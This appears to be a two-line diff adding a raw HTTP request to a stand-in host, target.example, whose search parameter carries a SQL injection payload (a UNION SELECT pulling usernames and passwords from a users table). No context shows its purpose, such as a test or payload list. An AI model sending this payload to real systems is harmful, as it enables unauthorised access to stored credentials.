@@ -1,0 +1,2 @@
+GET /search?q=' UNION SELECT username, password FROM users-- HTTP/1.1
+Host: target.example
